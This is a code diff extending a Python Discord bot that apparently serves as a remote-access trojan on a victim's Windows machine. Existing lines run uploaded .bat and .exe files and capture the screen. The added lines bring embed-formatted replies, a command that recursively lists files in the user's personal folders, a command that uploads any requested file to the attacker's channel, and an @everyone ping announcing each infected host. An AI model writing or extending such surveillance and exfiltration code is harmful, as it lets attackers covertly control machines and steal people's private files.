@@ -57,13 +57,17 @@ async def send(ctx):
         try:
             if file_path.endswith(".bat") or file_path.endswith(".exe"):
                 subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                await ctx.send(f"Executed {attachment.filename} successfully!")
+                embed = discord.Embed(title="File Execution", description=f"Executed {attachment.filename} successfully!", color=discord.Color.green())
+                await ctx.send(embed=embed)
             else:
-                await ctx.send(f"Unsupported file type: {attachment.filename}")
+                embed = discord.Embed(title="Unsupported File Type", description=f"Unsupported file type: {attachment.filename}", color=discord.Color.red())
+                await ctx.send(embed=embed)
         except Exception as e:
-            await ctx.send(f"Failed to execute {attachment.filename}: {str(e)}")
+            embed = discord.Embed(title="Execution Failed", description=f"Failed to execute {attachment.filename}: {str(e)}", color=discord.Color.red())
+            await ctx.send(embed=embed)
     else:
-        await ctx.send("No file attached. Please attach a file to send.")
+        embed = discord.Embed(title="No File Attached", description="No file attached. Please attach a file to send.", color=discord.Color.orange())
+        await ctx.send(embed=embed)
 
 # Command to take a screenshot
 @bot.command()
@@ -78,7 +82,79 @@ async def screenshot(ctx):
     byte_io = io.BytesIO()
     screenshot.save(byte_io, 'PNG')
     byte_io.seek(0)
-    await ctx.send("Here is the screenshot:", file=discord.File(byte_io, 'screenshot.png'))
+    embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.blue())
+    embed.set_image(url="attachment://screenshot.png")
+    await ctx.send(embed=embed, file=discord.File(byte_io, 'screenshot.png'))
+
+# Command to list specific directories and their contents
+@bot.command()
+async def filelist(ctx):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        return
+
+    # Define the directories to list
+    directories = ["Downloads", "Documents", "Videos", "Pictures"]
+
+    # List all files and directories in the specified directories recursively
+    file_list = []
+    for dir_name in directories:
+        dir_path = os.path.join(os.path.expanduser("~"), dir_name)
+        if os.path.exists(dir_path):
+            for root, dirs, files in os.walk(dir_path):
+                for name in dirs:
+                    file_list.append(os.path.join(root, name))
+                for name in files:
+                    file_list.append(os.path.join(root, name))
+
+    # Split the file list into chunks of 3 embeds
+    chunk_size = 3
+    for i in range(0, len(file_list), chunk_size):
+        chunk = file_list[i:i + chunk_size]
+        file_list_str = "\n".join(chunk)
+        embed = discord.Embed(title="File List", description=f"Files and directories in specified folders:\n{file_list_str}", color=discord.Color.blue())
+        await ctx.send(embed=embed)
+
+# Command to download a specific directory or file
+@bot.command()
+async def download(ctx, path: str):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        return
+
+    # Prepend the current user's home directory if the path does not start with a drive letter
+    if not os.path.isabs(path):
+        path = os.path.join(os.path.expanduser("~"), path)
+
+    # Check if the path exists
+    if os.path.exists(path):
+        if os.path.isdir(path):
+            # List all files in the specified directory
+            files = os.listdir(path)
+            file_list = "\n".join([os.path.join(path, file) for file in files])
+            embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.blue())
+            await ctx.send(embed=embed)
+        elif os.path.isfile(path):
+            # Send the file as an attachment
+            await ctx.send(file=discord.File(path))
+        else:
+            embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.red())
+            await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.red())
+        await ctx.send(embed=embed)
+
+# Command to list all available commands
+@bot.command()
+async def cmds(ctx):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        return
+
+    # List all commands
+    command_list = "\n".join([f"!{cmd.name}" for cmd in bot.commands])
+    embed = discord.Embed(title="Available Commands", description=f"Commands:\n{command_list}", color=discord.Color.blue())
+    await ctx.send(embed=embed)
 
 # On bot startup: Check and create the channel, ping @everyone in the corresponding channel
 @bot.event
@@ -102,6 +178,8 @@ async def on_ready():
 
     # Send a "ping" message to indicate the bot is online
     await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")
+    embed = discord.Embed(title="Bot Online", description=f"The bot is now online and active on {desktop_name}.", color=discord.Color.green())
+    await channel.send(embed=embed)
 
     print(f"Bot is online. Pinged channel: {channel.name}")
 
